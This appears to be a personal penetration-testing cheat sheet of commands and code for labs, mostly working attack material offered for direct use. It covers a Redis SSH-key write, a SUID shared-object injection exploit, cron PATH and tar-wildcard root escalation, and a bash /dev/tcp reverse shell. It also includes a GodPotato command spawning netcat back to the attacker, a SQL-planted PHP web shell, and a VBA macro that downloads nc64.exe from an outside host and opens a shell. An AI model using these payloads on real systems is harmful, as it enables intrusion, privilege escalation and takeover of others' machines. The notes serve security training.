# <span style="color:rgb(11, 142, 224)">General : </span>

MTU:
if terminals get stuck : 
try lowering the MTU to below 1250. We recommend decreasing it in increments of 50 until the connection becomes stable, but please do not set it below 700.
```
sudo ip link set dev tun0 mtu 1000
```
Also, ensure that you are using Google's DNS servers in your Kali by running these commands:  
`sudo chattr -i /etc/resolv.conf` `sudo bash -c "" echo nameserver 8.8.8.8 > /etc/resolv.conf"" && sudo bash -c "" echo nameserver 8.8.4.4 >> /etc/resolv.conf""`

Password cracking 
john will automatically identify the hashing algorithm
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
# <span style="color:rgb(11, 142, 224)">Enumeration </span>

not always will the machine allow ping 
thats why add -Pn also in nmap
because firewall block ping
you can open the ip website in your browser and check 

Nmap 
```
sudo nmap --min-rate 10000 -sCV -p- -Pn <IP>
```

When the TCP scan finishes, immediately run a UDP scan.
```
sudo nmap -Pn -n -sU --top-ports=100 --reason $IP
```

Gobuster
smaller : 
```
sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -u <IP>
```
larger : 
```
sudo gobuster dir -w /usr/share/wordlists/dirb/big.txt -x html,txt,php -u <IP>
```

go to website 
```
/about.html
```

Wordpress enumeration 
```
wpscan --url http:<IP> -e ap,at,u
```

Redis 
```
redis-cli -h <IP> # to connect to the server

after connecting : 
info                            # to get information/details about the server
SELECT <database_index>         # select databse
keys *                          # to key all key names
get <Key name>                  # to get value of the key 
config get dir                  # to get config directory for redis
config set dir /var/lib/redis/.ssh>  # to set a new directory

ssh-keygen -t ed25519           # to make new kali pub ssh key (run as kali user)
ls -la ~/.ssh/     # to see kali public ssh key 
( echo -e "\n\n"; cat ~/.ssh/id_ed25519.pub; echo -e "\n\n") > id_rsa.pub   # to make it in format which redis accepts it 

cat id_rsa.pub | redis-cli -h <redis ip> -x set <new key name> # make a new key

config set dbfilename "authorized_keys"    # write our key to redis disk 
save                                       # to save the file now

ssh redis@<redis ip> -i ~/.ssh/<private key>  # ssh into redis from kali 
```


# <span style="color:rgb(11, 142, 224)">File Transfer </span>

Start server on kali : 
you won't be able to start on 80 on victim machine if it already has something running
```
python3 -m http.server 8000
```

Linux get file : 
```
wget http://KALI_VPN_IP:8000/filename -O filename
curl http://<ip>/filename -o filename

nc <victim ip> 4444 < filename     # sender 
nc -lvnp 4444 > filename           # receiver
```

Windows get file : 
if you want to switch from cmd to powershell:
```
powershell iwr http://KALI_IP:8000/filename -o filename
```
PowerShell:
```
iwr http://KALI_IP:8000/filename -outfile filename
Invoke-WebRequest http://KALI_IP:8000/filename -outfile filename
```
CMD:
```
curl http://KALI_IP:8000/file -o file
```

SMB : 
```
on attacker machine : 
impacket-smbserver -smb2support randomname . -username user -password password

on victim machine : 
net use z: \\192.168.45.206\test /u:test test
dir z:
```
here , "randomname" is just a random name given , and can give any username and password 
"." here is work in the current directory
authentication required as some servers so not accept without auth
# <span style="color:rgb(11, 142, 224)">Port Forwarding/Pivoting </span>

after gaining initial access , to discover more devices on same network use nmap to scan
download from : (on kali attacker machine)
```
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
```
transfer to victim machine , then run : 
```
./nmap -sn <victim ip>/24     # /24 since only last octet is changing in subnet
```
remove first (gateway) and last ip (broadcast)
now check which machine you can access now 
```
./nmap -p0-100 -vv <different left ips>
```

SSH : 
to do local port forwarding :
```
ssh -L <attacker local port>:<target ip>:<target port> root@<through which ip> -i id_rsa -fN 

localhost:8000      # now everything visible on this 
127.0.0.1:8000
```
to do remote port forwarding :
```
ssh -R <local port to open>:<which final internal network machine ip>:<which target port to forward to of internal network machine> kali@<kali ip> -fN
```
to do dynamic port forwarding : (on kali)
```
ssh -D 9050 -i id_rsa root@<ip to forward traffic to>
```


Chisel : 
```
sudo apt install chisel     #kali linux - attacker 

https://github.com/jpillora/chisel/releases/tag/v1.12.0   # windows 
chisel_1.12.0_windows_amd64.zip
```
Attacker / Kali — start server : 
```
chisel server -p 8080 --reverse
```
Pivot / Win1 — connect back to Kali and create reverse forward : 
```
chisel.exe client <KALI_IP>:<CHISEL_PORT> R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>
```

Chisel with SOCKS (for dynamic port forwarding):
```
sudo gedit /etc/proxychains.conf
add line in last : socks5 127.0.0.1 9050
```
Attacker / Kali — start server : 
```
chisel server -p 8000 --reverse
```
Pivot / Win1 — connect back to Kali and create reverse forward : 
```
chisel.exe client <KALI_IP>:8000 R:<SOCKS_PORT>:socks
#chisel.exe client 10.10.10.5:8000 R:9050:socks
```

# <span style="color:rgb(11, 142, 224)">Linux Privilege Escalation</span>

Find Flag 
```
find / -name "local.txt" 2>/dev/null
find / -name "proof.txt" 2>/dev/null
```

###### SUDO exploitation : 
programs "user" allowed to run via sudo
```
sudo -l 
```
go to gtfo bins
and use sudo before command as `sudo <command>`


##### SUID Executables : 
###### Known exploits : 
Find all the SUID/SGID executables on the Debian VM
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

```
find / -user root -perm /4000 2>/dev/null
```
Find known exploit for `versions` found of executables on searchsploit , Google, and GitHub
or go to gtfo bins 
###### SUID shared object (.so) injection : 
find a `-so` executables
then run this to check the files its asking for but not available 
```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
# replace the file name with the shared file name/location
```
ex we get its asking for another shared object : `/home/user/.config/libcalc.so`
create that directory by `mkdir /home/user/.config`
go inside that directory and create a exploit : 
```
nano exploit.c
```
and paste this code 
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```
give permission `chmod +x exploit.c`
compile the code to that location it asks for 
```
gcc -shared -fPIC -o /home/user/.config/libcalc.so exploit.c
```
now again run the initial executable
```
/usr/local/bin/suid-so
# run directly , you will get a root shell now
```
###### Environment Variables (without absolute service path) : 
find if you have any env files : `/usr/local/bin/suid-env`
Find what it executes : `strings /usr/local/bin/suid-env`
see if it starts any service without proving the full path
if no , create an exploit : 
```
nano service.c
```
and paste the code :
```
int main() {
        setuid(0);
        system("/bin/bash -p");
}
```
Compile it:
```
gcc -o service service.c
```
Put your directory first in PATH
```
PATH=.:$PATH
# "." means: the current directory
```
now just run the executable again : 
```
/usr/local/bin/suid-env
```

##### Cron tabs :
###### Weak File Permissions : 
minute ; hour ; day of month ; month ; day of week
```
1. View System-wide crontab: cat /etc/crontab
2. check if path is writeable
3. locate <filename>
```
replace content of file with : 
```
#!/bin/bash
<put bash reverse shell>
# bash -i >& /dev/tcp/<kali ip>/4444 0>&1
```
and start listener on kali
```
nc -nvlp 4444
```

###### PATH Manipulation : 
View the contents of the system-wide crontab:  
```
cat /etc/crontab
```
Note that the PATH variable starts with **/home/user** which is our user's home directory.
Create a file called **overwrite.sh** in your home directory with the following contents:
```
#!/bin/bash  
cp /bin/bash /tmp/rootbash  
chmod +xs /tmp/rootbash
```
Make sure that the file is executable:
```
chmod +x /home/user/overwrite.sh
```
Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
```
/tmp/rootbash -p
```
or 
change the path ! 
```
export PATH=/tmp:$PATH
# export PATH=<directory which you want to add to path>:$PATH
# echo $PATH
```

###### Wild Cards :
cat the cron job file 
if it has `tar czf /tmp/backup.tar.gz *`
check gtfo bin if it has `-- option name` available or not
then in the path it takes , create these files : 
Create a script that will run as root:
```
cat > shell.sh <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
```
Make it executable:
```
chmod +x shell.sh
```
Now create the malicious filenames:
```
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```
Check them:
```
ls -la
```
After it cron executes (ex. after every minute) , check:
```
ls -l /tmp/rootbash
```
Then:
```
/tmp/rootbash -p
```

##### Others : 
read bash (commands and password entered) history : 
```
cat ~/.*history
# .zsh_history ; python history ; mysql history
```
ssh keys : 
```
cd /home/kali/.ssh
/root/.ssh

#if you get it : chmod 600 id_rsa
```
browser saved passwords : 
```
git clone https://github.com/alessandroz/lazagne
```
password files readable/writeable : 
```
ls -la /etc/passwd
ls -la /etc/shadow

# create a new passowrd hash and paste it there : 
openssl passwd -6 password123 #create a new passowrd hash ; $6$ is sha512
```

# <span style="color:rgb(11, 142, 224)">Windows Privilege Escalation</span>

like `tmp` folder in linux , windows has `tasks` folder , which is world writeable
```
PS C:\Windows> cd tasks
```

to check current user 
```
whoami
```
if it's "NT AUTHORITY\SYSTEM" you are administrator 
otherwise no

to check current priveleges
```
whoami /priv
```

Full powers : 
for getting more privileges from normal user : 
```
https://github.com/itm4n/FullPowers
```
run : 
```
.\FullPowers.exe
```

well now use `SeImpersonatePrivilege` to gain administrator rights

Order : 
1. god potato 
2. juicy potato 
3. print spoofer (don't use now , it's outdated)

GodPotato : 
to gain privilege escalation from elevated privileges
```
https://github.com/BeichenDream/GodPotato
```
download the net4 version
execute : 
transfer `nc.exe` to windows first
First locate a copy:
```
find /usr/share -iname "nc.exe" 2>/dev/null
```
then copy it to current folder where python server is running 
```
cp /usr/share/windows-resources/binaries/nc.exe .
```
cmd 
```
curl http://KALI_IP:8000/nc.exe -o nc.exe
```
start a listener on Kali:
```
nc -lvnp 4444
```
Then from the Windows LOCAL SERVICE shell:
```
.\GodPotato-NET4.exe -cmd "cmd /c nc.exe YOUR_KALI_VPN_IP 4444 -e cmd.exe"
```
Your Kali listener should then receive a **new shell**.

Find Flag 
do manually first 
users > desktop/documents
```
where /r C:\ local.txt
where /r C:\ proof.txt
```


# <span style="color:rgb(11, 142, 224)">Active Directory</span>




# <span style="color:rgb(11, 142, 224)">Web Application </span>

use default credentials 
of username : password same you found , 
admin:admin etc

phpmyadmin : 
username : root 
password : leave empty (in some versions it's "password")


Php get upload option to upload any file on website itself 
```
https://gist.github.com/BababaBlue
```

```
SELECT 
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';
```
after that , upload `PHP Ivan Sincek` revershell to the website


Squid Proxy :
configure FoxyProxy extension 
with port number and ip address of victim machine 
and then load the website 


Macro :
```vb
Sub MyMacro
	Dim str as String
	str = "cmd.exe /c certutil -f -urlcache http://10.10.14.21/nc64.exe C:\Programdata\nc.exe && C:\Programdata\nc64.exe -e cmd.exe 10.10.14.21 4445"
	Shell(str)
End Sub
```

Alternative: Automating with Metasploit
Metasploit has a module that auto-generates a malicious `.odt` with cross-platform VBA payloads (Windows, macOS, Linux).
Generate the Payload : 
```bash
msfconsole
use exploit/multi/fileformat/openoffice_document_macro
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.21
set LPORT 4445
run
```
This outputs a ready-to-upload `.odt` file.

Catch the Shell :
```bash
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.21
set LPORT 4445
run
```
Once the bot opens the document → Metasploit catches the staged connection → **Meterpreter session opened**.
```
sessions -i 1
```

Steps : 
1. Identify Web Tech (language, framework, libs, cms, etc) - use wappalyzer
2. Look for CVE if it uses public framework / libs / cms, if it doesnt work the first time then it doesnt work.
3. Then Find likely vulnerable feature such as file upload, local file inclusion, sqli.
4. try default credentials if you found login page.
5. If it doesnt work then it's likely credentials hunting.
6. Find for credentials in the landing page, and every shown pages and directory. look for names, username, password. If you see a string thats kinda weird thats could be a username or password.
7. Can't find password ? try username as password. spray this credentials to other service.
8. Can't find anything ? Fuzz the directory, look for differences on response type / length could be a clue. then fuzz the sub directory again (using seclist is enough).
9. Still can't find anything ? then its a rabbit hole.


